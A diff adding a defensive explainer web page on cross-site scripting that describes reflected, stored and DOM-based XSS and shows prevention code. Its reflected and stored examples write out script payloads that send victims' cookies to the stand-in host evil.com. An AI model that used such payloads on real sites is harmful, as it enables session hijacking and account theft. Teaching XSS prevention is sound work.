@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <title>What Is XSS (Cross-Site Scripting)? — LochBot</title>
+  <meta name="description" content="Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users. The injec">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://lochbot.com/answers/what-is-xss.html">
+  <link rel="alternate" type="application/atom+xml" title="LochBot Blog Feed" href="/blog/feed.xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <meta property="og:title" content="What Is XSS (Cross-Site Scripting)? — LochBot">
+  <meta property="og:description" content="Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users. The injec">
+  <meta property="og:url" content="https://lochbot.com/answers/what-is-xss.html">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="https://lochbot.com/assets/og-image.png">
+  <meta property="og:site_name" content="Zovo Tools">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="What Is XSS (Cross-Site Scripting)? — LochBot">
+  <meta name="twitter:description" content="Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users. The injec">
+  <meta name="twitter:image" content="https://lochbot.com/assets/og-image.png">
+  <script type="application/ld+json">
+  {
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is XSS?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. The script executes in the victim's browser with their session privileges, enabling cookie theft, session hijacking, and account takeover."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I prevent XSS?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Use output encoding (escape HTML entities), Content-Security-Policy headers, framework auto-escaping (React, Vue, Angular), and avoid innerHTML. Validate and sanitize all user input on both client and server side."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is the difference between reflected and stored XSS?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Reflected XSS requires the victim to click a malicious link — the payload is in the URL. Stored XSS is permanently saved on the server and attacks every user who views the page, making it more dangerous."
+      }
+    }
+  ]
+}
+  </script>
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header>
+    <div class="container header-inner">
+      <a href="/" class="logo">Loch<span>Bot</span></a>
+      <button class="mobile-toggle" aria-label="Menu">&#9776;</button>
+      <nav>
+        <a href="/">Scanner</a>
+        <a href="/about.html">About</a>
+        <a href="/blog/">Blog</a>
+        <div class="nav-right">
+          <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=nav-link" class="nav-pro" target="_blank">Go Pro &#10022;</a>
+          <a href="https://zovo.one/tools" class="nav-zovo">Zovo Tools</a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <nav class="breadcrumb" aria-label="Breadcrumb">
+    <div class="container">
+      <a href="/">Home</a> &rsaquo; <a href="/answers/">Answers</a> &rsaquo; <span>What Is XSS (Cross-Site Scripting)?</span>
+    </div>
+  </nav>
+
+  <div class="page-content">
+    <h1>What Is XSS (Cross-Site Scripting)?</h1>
+
+    <p><strong>Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users. The injected script runs in the victim's browser with full access to their session, cookies, and the page DOM, enabling session hijacking, data theft, and account takeover.</strong></p>
+
+
+    <h2>Types of XSS (Cross-Site Scripting)?</h2>
+    <h3>Reflected XSS</h3>
+    <p>Malicious script is embedded in a URL or form submission and reflected back in the server's response. The attack requires the victim to click a crafted link.</p>
+    <pre><code>https://example.com/search?q=&lt;script&gt;document.location=&quot;https://evil.com/?c=&quot;+document.cookie&lt;/script&gt;</code></pre>
+
+    <h3>Stored XSS</h3>
+    <p>Malicious script is permanently stored on the server (in a database, comment field, or user profile) and served to every user who views the affected page.</p>
+    <pre><code>An attacker posts a comment containing &lt;script&gt;fetch(&quot;https://evil.com/steal?cookie=&quot;+document.cookie)&lt;/script&gt;</code></pre>
+
+    <h3>DOM-based XSS</h3>
+    <p>The vulnerability exists in client-side JavaScript that processes untrusted data (URL fragments, postMessage data) and writes it to the DOM without sanitization.</p>
+    <pre><code>document.getElementById(&quot;output&quot;).innerHTML = location.hash.substring(1)</code></pre>
+
+    <h2>How to Prevent It</h2>
+    <pre><code>// 1. Output encoding — escape HTML entities
+function escapeHtml(str) {
+  return str.replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;')
+    .replace(/&gt;/g, '&amp;gt;').replace(/&quot;/g, '&amp;quot;').replace(/'/g, '&amp;#039;');
+}
+
+// 2. Use textContent instead of innerHTML
+element.textContent = userInput;  // Safe
+element.innerHTML = userInput;    // DANGEROUS
+
+// 3. Content-Security-Policy header
+// Content-Security-Policy: script-src 'self'
+
+// 4. Framework auto-escaping (React, Vue, Angular)
+// React: {userInput} is auto-escaped
+// Vue: {{ userInput }} is auto-escaped
+// Angular: {{ userInput }} is auto-escaped</code></pre>
+
+    <h2>Real-World Impact</h2>
+    <p>Session hijacking via cookie theft, account takeover, keylogging, phishing via page defacement, cryptocurrency mining, worm propagation (Samy worm infected 1M MySpace profiles in 20 hours).</p>
+
+
+    <h2>Related Questions</h2>
+    <ul>
+      <li><a href="/answers/content-security-policy.html">Content Security Policy</a></li>
+      <li><a href="/answers/x-xss-protection.html">X Xss Protection</a></li>
+      <li><a href="/answers/what-is-csrf.html">What Is Csrf</a></li>
+      <li><a href="/answers/how-to-prevent-prompt-injection.html">How To Prevent Prompt Injection</a></li>
+    </ul>
+
+    <p style="margin-top:2rem;"><a href="/">Scan your system prompt with LochBot</a> &mdash; free, client-side, no data sent anywhere.</p>
+  </div>
+
+  <section class="faq-section" style="max-width:720px;margin:2rem auto;">
+    <h2>Frequently Asked Questions</h2>
+    <details>
+      <summary>What is XSS?</summary>
+      <p>XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. The script executes in the victim's browser with their session privileges, enabling cookie theft, session hijacking, and account takeover.</p>
+    </details>
+    <details>
+      <summary>How do I prevent XSS?</summary>
+      <p>Use output encoding (escape HTML entities), Content-Security-Policy headers, framework auto-escaping (React, Vue, Angular), and avoid innerHTML. Validate and sanitize all user input on both client and server side.</p>
+    </details>
+    <details>
+      <summary>What is the difference between reflected and stored XSS?</summary>
+      <p>Reflected XSS requires the victim to click a malicious link — the payload is in the URL. Stored XSS is permanently saved on the server and attacks every user who views the page, making it more dangerous.</p>
+    </details>
+  </section>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">Zovo Tools</div>
+      <div class="footer-tagline">Free developer tools by a solo dev. No tracking.</div>
+      <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=footer-link" class="footer-cta">Zovo Lifetime &mdash; $99 once, free forever &rarr;</a>
+      <div class="footer-copy">&copy; 2026 <a href="https://zovo.one">Zovo</a> &middot; 47/500 founding spots</div>
+    </div>
+  </footer>
+
+  <nav class="zovo-network" aria-label="Zovo Tools Network">
+    <div class="zovo-network-inner">
+      <h3 class="zovo-network-title">Explore More Tools</h3>
+      <div class="zovo-network-links">
+        <a href="https://abwex.com">ABWex — A/B Testing</a>
+        <a href="https://claudflow.com">ClaudFlow — Workflows</a>
+        <a href="https://claudhq.com">ClaudHQ — Prompts</a>
+        <a href="https://claudkit.com">ClaudKit — API</a>
+        <a href="https://enhio.com">Enhio — Text Tools</a>
+        <a href="https://epochpilot.com">EpochPilot — Timestamps</a>
+        <a href="https://gen8x.com">Gen8X — Color Tools</a>
+        <a href="https://gpt0x.com">GPT0X — AI Models</a>
+        <a href="https://heytensor.com">HeyTensor — ML Tools</a>
+        <a href="https://invokebot.com">InvokeBot — Webhooks</a>
+        <a href="https://kappafy.com">Kappafy — JSON</a>
+        <a href="https://kappakit.com">KappaKit — Dev Toolkit</a>
+        <a href="https://kickllm.com">KickLLM — LLM Costs</a>
+        <a href="https://krzen.com">Krzen — Image Tools</a>
+        <a href="https://lockml.com">LockML — ML Compare</a>
+        <a href="https://ml3x.com">ML3X — Matrix Math</a>
+      </div>
+    </div>
+  </nav>
+</body>
+</html>
